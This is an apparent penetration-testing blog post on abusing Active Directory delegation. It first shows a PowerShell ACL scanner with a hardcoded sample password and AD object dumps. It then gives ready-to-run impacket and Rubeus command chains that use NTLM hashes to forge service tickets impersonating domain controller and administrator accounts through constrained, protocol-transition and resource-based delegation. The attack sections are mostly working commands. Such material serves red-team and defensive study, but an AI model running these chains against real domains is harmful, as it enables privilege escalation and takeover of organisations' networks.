[back](/blog)

### Difference in delegation abuse techniques

We often come across the delegation of services or resources in Active Directory. But sometimes it is difficult for us to find the necessary ways of abuse for such privileges. In this connection, I decided to compile a manual that will help with determining operating techniques for different types of delegation.


#### A few words about searching for insecure ACLs in Active Directory:

I recently ran into a problem collecting a rather important attribute **ActiveDirectoryRights: Self**.
The fact is that when collecting an AD dump, for example through BloodHound Collector, this attribute is not taken when building object links. However, it's abuse will help the user add himself to the appropriate group to which the user's SecurityIdentifier is assigned. More details are described [here](https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/self).

```
ObjectDN               : CN=ServiceMgmt,CN=Users,DC=domain,DC=ru
ObjectSID              : S-1-5-21-4078382237-1492182817-2568127209-7683
ActiveDirectoryRights  : Self
SecurityIdentifierName : domain\jaki
BinaryLength           : 36
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 8
SecurityIdentifier     : S-1-5-21-4078382237-1492182817-2568127209-7682
AceType                : AccessAllowed
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None

```

By the way, to display SecurityIdentifierName, my good friend [crypt0p3g](https://github.com/crypt0p3g) made a cool script that allows you to search for ACLs on AD objects and compare them with SecurityIdentifier, without having to find out who owns the SID:

```
ACL AD Scanner

$username = "domain.ru\jaki";
$pass = 's4per$ecu4r3';
$domain = "domain.ru";
$dc = "dc01.domain.ru";

$cred = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $pass -AsPlainText -Force));
$DS=Get-DomainSID -Domain domain.ru -Server $dc -Credential $cred;

#to get group ACL and match with object who have rights
Get-DomainGroup -Domain $domain -Server $dc -Credential $cred | Get-DomainObjectAcl -Domain $domain -Server $dc -Credential $cred |? {if ($_.SecurityIdentifier -match $DS+"-\d{4,5}") { add-member -InputObject $_ -MemberType NoteProperty -Name SecurityIdentifierName -Value ($_.SecurityIdentifier | Convert-SidToName -Domain $domain -Credential $cred -Server $dc)[1]; $_}}

#to get object ACL and match with object who have rights
Get-DomainObject -Domain $domain -Server $dc -Credential $cred | Get-DomainObjectAcl -Domain $domain -Server $dc -Credential $cred |? {if ($_.SecurityIdentifier -match $DS+"-\d{4,5}") { add-member -InputObject $_ -MemberType NoteProperty -Name SecurityIdentifierName -Value ($_.SecurityIdentifier | Convert-SidToName -Domain $domain -Credential $cred -Server $dc)[1]; $_}}

```

This can be done differently if you need to look at the ACL for a specific object, but you have to run several commands and look at the SecurityIdentifier with your eyes.

```
Get-DomainObjectAcl SERVICEMGMT -Domain domain.ru -DomainController dc01.domain.ru

ObjectDN              : CN=ServiceMgmt,CN=Users,DC=domain,DC=ru
ObjectSID             : S-1-5-21-4078382237-1492182817-2568127209-7683
ActiveDirectoryRights : Self
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 8
SecurityIdentifier    : S-1-5-21-4078382237-1492182817-2568127209-7682
AceType               : AccessAllowed
AceFlags              : None
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
AuditFlags            : None

Get-DomainObject  S-1-5-21-4078382237-1492182817-2568127209-7682 -Domain domain.ru -DomainController dc01.domain.ru

logoncount                    : 74
badpasswordtime               : 4/9/2023 12:54:33 PM
distinguishedname             : CN=jaki,CN=Users,DC=domain,DC=ru
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 4/8/2023 7:03:41 PM
name                          : jaki
objectsid                     : S-1-5-21-4078382237-1492182817-2568127209-7682
samaccountname                : jaki
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 8/25/2023 10:04:43 PM
instancetype                  : 4
usncreated                    : 69311
objectguid                    : edb118e8-3995-45d9-89f1-bf978e4e7fa4
lastlogoff                    : 1/1/1601 2:00:00 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=domain,DC=ru
dscorepropagationdata         : {8/25/2023 10:04:43 PM, 1/1/1601 12:00:00 AM}
lastlogon                     : 4/9/2023 1:21:20 PM
badpwdcount                   : 0
cn                            : jaki
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 4/8/2023 9:07:56 AM
primarygroupid                : 513
pwdlastset                    : 4/8/2023 12:07:56 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 118956

```

So we found out that jaki can add himself to the ServiceMgmt group, although as you can see BloodHound did not know this.

![Image](/img/acl_ad_cd/1.png)

I tested different types of collectors, such as dump collection from the network [Bloodhound.py](https://github.com/dirkjanm/BloodHound.py), as well as standard collectors from the repository [Bloodhound Collectors](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors), as a result we never saw this **ActiveDirectoryRights: Self** attribute. By the way, the BloodHound network collector very often skips ACL collection as such, so i try to use .exe or .ps1


#### About Constrained Delegation. So we have 3 different types of constrained delegation:

1. msds-allowedtodelegateto / Constrained w/o Protocol Transition
	1. Service Constrained Delegation
		1. Use kerberos only
			1. Self Constrained delegation without KB5014692
			1. Additional SPN account for KB5014692

2. msds-allowedtodelegateto / Constrained w/ Protocol Transition
	2. Service Constrained Delegation
		2. Use any authentication protocol

3. msds-allowedtoactonbehalfofotheridentity
	3. Resource-based Constrained Delegation

Each type of сonstrained delegation is operated differently and has its own options. The script from the impacket library findDelegation.py shows well the difference in the delegation attributes found. But you can also use Get-DomainObject

![Image](/img/acl_ad_cd/2.png)

```
Get-DomainObject delegator$ -Domain domain.ru -DomainController dc01.domain.ru


pwdlastset                     : 10/6/2023 12:51:36 AM
logoncount                     : 15
badpasswordtime                : 10/6/2023 12:53:50 AM
msds-managedpasswordpreviousid : {1, 0, 0, 0...}
distinguishedname              : CN=delegator,CN=Managed Service Accounts,DC=domain,DC=ru
objectclass                    : {top, person, organizationalPerson, user...}
lastlogontimestamp             : 10/6/2023 12:51:44 AM
name                           : delegator
objectsid                      : S-1-5-21-4078382237-1492182817-2568127209-7687
msds-groupmsamembership        : {1, 0, 4, 128...}
localpolicyflags               : 0
codepage                       : 0
samaccounttype                 : MACHINE_ACCOUNT
accountexpires                 : NEVER
countrycode                    : 0
whenchanged                    : 10/5/2023 9:51:44 PM
instancetype                   : 4
usncreated                     : 69353
objectguid                     : c9da97ae-5e35-44d2-aa15-114aecdc0caf
msds-managedpasswordid         : {1, 0, 0, 0...}
msds-allowedtodelegateto       : http/dc01.domain.ru
samaccountname                 : delegator$
objectcategory                 : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=domain,DC=ru
dscorepropagationdata          : 1/1/1601 12:00:00 AM
serviceprincipalname           : browser/dc01.domain.ru
msds-managedpasswordinterval   : 30
lastlogon                      : 10/6/2023 12:51:44 AM
badpwdcount                    : 1
cn                             : delegator
useraccountcontrol             : WORKSTATION_TRUST_ACCOUNT
whencreated                    : 4/8/2023 9:08:31 AM
primarygroupid                 : 515
iscriticalsystemobject         : False
msds-supportedencryptiontypes  : 28
usnchanged                     : 174195
lastlogoff                     : 1/1/1601 2:00:00 AM
dnshostname                    : gmsa.domain.ru

```



#### Self Constrained delegation without Protocol Transition:

For the machine account delegator$ constrained delegation without protocol transition is configured for http/dc01.domain.ru service. To abuse this type of delegation, you can assign the RBCD (Resource-based Constrained Delegation) attribute to yourself (delegator$) and then perform TGS service ticket requests using impacket-getST. Please note how s4u2self and s4u2proxy works in this case.

```
getTGT.py domain.ru/'delegator$' -hashes :fcb5ae2b5e8c05d7a938bbe8649e4a44 -dc-ip 10.10.10.100
export KRB5CCNAME=delegator\$.ccache
impacket-rbcd 'domain.ru/' -k -delegate-to 'delegator$' -use-ldaps -debug -action write -delegate-from 'delegator$'
impacket-getST -impersonate "dc01$" "domain.ru/delegator$" -k -no-pass -spn "browser/dc01.domain.ru"
impacket-getST -impersonate "dc01$" "domain.ru/delegator$" -k -no-pass -spn "http/dc01.domain.ru" -additional-ticket "dc01$.ccache"

```

However, this method may not work if patch [KB5014692](https://twitter.com/_nwodtuhs/status/1543572195217182721) is installed. In this case, you need another machine account, or any account with the SPN attribute.


#### Constrained delegation without Protocol Transition (additional SPN account):

```
getTGT.py domain.ru/'delegator$' -hashes :fcb5ae2b5e8c05d7a938bbe8649e4a44 -dc-ip 10.10.10.100
export KRB5CCNAME=delegator\$.ccache
impacket-rbcd 'domain.ru/' -k -delegate-to 'delegator$' -use-ldaps -debug -action write -delegate-from jaki_spn
impacket-getTGT 'domain.ru/jaki_spn:s4per$ecu4r3'
export KRB5CCNAME=jaki_spn.ccache
impacket-getST -spn "browser/dc01.domain.ru" -impersonate "dc01$" "domain.ru/jaki_spn" -k -no-pass
describeTicket.py dc01$.ccache

```

![Image](/img/acl_ad_cd/3.png)

```
export KRB5CCNAME=delegator\$.ccache
impacket-getST -spn "http/dc01.domain.ru" -impersonate "dc01$" -additional-ticket "dc01$.ccache" "domain.ru/delegator$" -k -no-pass
describeTicket.py dc01$.ccache
```

![Image](/img/acl_ad_cd/4.png)

#### Constrained delegation with Protocol Transition:

This method of delegation abuse is a classic method of exploitation, the TGS ticket is forwarded and can completely go through the s4u2self and s4u2proxy chain.

```
execute-assembly /tmp/Rubeus.exe s4u /impersonateuser:DC01 /msdsspn:time/dc.domain.ru /user:jaki_pc /rc4:fcb5ae2b5e8c05d7a938bbe8649e4a44 /altservice:cifs/dc.domain.ru /nowrap – convenient for .kirbi export
execute-assembly /tmp/Rubeus.exe s4u /impersonateuser:DC01 /msdsspn:time/dc.domain.ru /user:jaki_pc /rc4:fcb5ae2b5e8c05d7a938bbe8649e4a44 /altservice:cifs/dc.domain.ru /ptt – convenient for TGS import

OR just

getST.py domain.ru/JAKI_PC\$ -dc-ip domain.ru -impersonate administrator -spn time/dc.domain.ru -altservice cifs/dc.domain.ru
```

#### Resource-based Constrained Delegation:

This type of delegation is used in the same way as Constrained delegation with Protocol Transition. Instead of a service, the msds-allowedtoactonbehalfofotheridentity attribute specifies a link to the machine account object and there is also no need to use the altservice flag, because delegation goes to the machine account

```
execute-assembly /tmp/Rubeus.exe s4u /impersonateuser:DC01 /msdsspn:cifs/dc.domain.ru /user:jaki_pc /rc4:fcb5ae2b5e8c05d7a938bbe8649e4a44 /nowrap – convenient for .kirbi export
execute-assembly /tmp/Rubeus.exe s4u /impersonateuser:DC01 /msdsspn:cifs/dc.domain.ru /user:jaki_pc /rc4:fcb5ae2b5e8c05d7a938bbe8649e4a44 /ptt – convenient for TGS import

OR just

getST.py domain.ru/JAKI_PC\$ -dc-ip domain.ru -impersonate administrator -spn time/dc.domain.ru
```

![Image](/img/acl_ad_cd/5.png)


Useful links:

+ [ActiveDirectoryRights: Self](https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/self)
+ [ThePorgs Impacket](https://github.com/ThePorgs/impacket)
+ [crypt0p3g](https://github.com/crypt0p3g)

<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/blog)